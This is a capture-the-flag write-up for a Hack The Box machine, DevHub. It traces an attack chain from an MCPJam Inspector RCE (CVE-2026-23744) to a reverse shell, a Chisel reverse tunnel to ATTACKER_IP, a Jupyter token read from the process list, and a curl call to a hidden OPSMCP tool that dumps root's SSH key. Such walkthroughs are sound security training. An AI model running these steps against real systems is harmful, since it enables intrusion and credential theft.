# DevHub

DevHub is a Linux-based Hack The Box machine focused on web enumeration, MCP services, and internal service enumeration. The attack path involves exploiting an exposed MCPJam Inspector instance, tunneling an internal Jupyter service, and abusing a hidden OPSMCP administrative function to obtain privileged access.

The first thing I did was conduct an nmap scan using the command below.

```bash
nmap -sCV -T4 10.129.245.216
```

<pre>
Nmap scan report for devhub.htb (10.129.103.240)
Host is up (0.18s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 35782e790d8713052f538ee73c55b64c (ECDSA)
|_  256 dd568ebcdab8383e9acd0b74ee5385f8 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: DevHub - Internal Development Platform
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.42 seconds
</pre>

Which gave me port 22 and 80 open. Meaning the next step would be to conduct web enumeration. However, doing so gave me no results, including subdomain enumeration.

So, the next step was to check the webpage manually, after adding `10.129.245.216    devhub.htb` to `/etc/hosts`.

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Devhub/Screenshots/1.png)

Opening the webpage gives us some information. On the left side, it mentions an MCP Inspector instance is running on port 6274. We will investigate that first.

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Devhub/Screenshots/2.png)

Doing so takes us to an MCPJam v1.4.2 instance. Further reconnaissance shows us that this version is vulnerable to RCE, particularly CVE-2026-23744.

### CVE-2026-23744

CVE-2026-23744 is a critical remote code execution vulnerability affecting MCPJam Inspector versions 1.4.2 and earlier.

The `/api/mcp/connect` endpoint accepts a `serverConfig` containing `command` and `args` without authentication or adequate security checks. Since MCPJam Inspector binds to `0.0.0.0` by default, the endpoint can be remotely reached and a crafted HTTP request can trigger arbitrary command execution.

The vulnerability requires no authentication or user interaction and is classified as CWE-306 (Missing Authentication for Critical Function). The vulnerability was fixed in version 1.4.3.

I used the vulnerability to obtain command execution on the target and establish a reverse shell.

### Initial Foothold

Using the PoC from [here](https://github.com/suljov/CVE-2026-23744-Remote-Code-Execution-POC), I established a reverse shell to the attacker machine. The shell was running as the `mcp-dev` user.

I then began enumerating the internal services because the initial nmap scan only exposed SSH and HTTP externally. I used [linpeas](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) to do so.

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Devhub/Screenshots/6.png)

This revealed several services listening locally, including the OPSMCP API on port `5000` and Jupyter on port `8888`.

### Jupyter Enumeration

The other important internal service was Jupyter, which was listening on the target's loopback interface.

and checked the listening port:

```bash
ss -lntp | grep ':8888'
```

The Jupyter instance was running under the `analyst` account.

Because the service was only locally accessible, I used port forwarding to access it from the attacker machine.

Using Chisel, the target connected back to the attacker:

```bash
./chisel client ATTACKER_IP:8000 R:8888:127.0.0.1:8888
```

The attacker ran the Chisel server with reverse forwarding enabled:

```bash
chisel server --reverse -p 8000
```

This exposed the target's local Jupyter service on the attacker's port `8888`.

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Devhub/Screenshots/7.png)

Opening it on firefox revealed that it requires a token/password to log into the instance.
Which was found by looking into the jupyter process running on the machine using `ps aux | grep jupyter`.

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Devhub/Screenshots/8.png)

Which revealed the token. After which, I opened up a terminal on the jupyter instance, gaining the user flag and analyst user.

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Devhub/Screenshots/user_flag.png)

## Privelege escalation

### OPSMCP Enumeration

The OPSMCP API was only accessible locally, so I first interacted with it from the compromised machine.
The API required an API key, which was discovered during enumeration:

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Devhub/Screenshots/11.png)

Running linpeas again, with the analyst user gave me some interesting files particularly the `server.py` in /opt/opsmcp/.

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Devhub/Screenshots/10.png)

Looking into server.py revealed an API key, used to authenticate the user into the OPSMCP server.

Further investigation of the OPSMCP application revealed that the server contained hidden tools which were not returned by `/tools/list`.

The source code contained:

```python
HIDDEN_TOOLS = {
    "ops._admin_dump": {
        "description": "Emergency credential dump - INTERNAL ONLY",
        "parameters": {"target": "string", "confirm": "boolean"}
    },
    "ops._debug_mode": {
        "description": "Enable debug mode",
        "parameters": {}
    }
}
```

Examining the implementation of ops._admin_dump showed that the target parameter could be set to ssh_keys. When confirm=true was provided, the function attempted to read /root/.ssh/id_rsa and return its contents:

```
elif tool_name == "ops._admin_dump":
        target = args.get('target', '')
        confirm = args.get('confirm', False)
        
        if not confirm:
            return jsonify({
                "error": "Confirmation required",
                "usage": "Set confirm=true to proceed",
                "warning": "This dumps sensitive credentials"
            })
        
        if target == "ssh_keys":
            try:
                with open('/root/.ssh/id_rsa', 'r') as f:
                    key_data = f.read()
                return jsonify({
                    "target": "ssh_keys",
                    "root_private_key": key_data,
                    "note": "Emergency recovery key dump"
                })
            except Exception as e:
                return jsonify({
                    "target": "ssh_keys",
                    "error": f"Could not read key: {str(e)}"
                })
```

This confirmed that ops._admin_dump was intentionally excluded from normal tool enumeration but remained accessible through the /tools/call endpoint.

Calling the hidden function with the ssh_keys target exposed the root user's private SSH key, providing the credentials required to establish SSH access as root.

Using this command, the SSH keys were found.
```
curl -X POST http://127.0.0.1:5000/tools/call -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" -H "Content-Type: application/json" -d '{"name":"ops._admin_dump", "arguments": {"confirm":true,"target":"ssh_keys"}}' | jq -r '.root_private_key' > ssh_key
```

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Devhub/Screenshots/root.png)

After correcting the key formatting and permissions:

```bash
chmod 600 ssh_key
```

I was able to use the key for SSH authentication:

```bash
ssh -i ssh_key root@devhub.htb
```

Allowing me access to the root account, giving me the root flag.

# Conclusion

The machine demonstrated a multi-stage attack chain, starting with web enumeration and CVE-2026-23744 RCE, followed by internal service enumeration and Chisel tunneling. Investigation of the OPSMCP application revealed hidden administrative functionality that exposed the root user's SSH private key, ultimately allowing privileged SSH access.
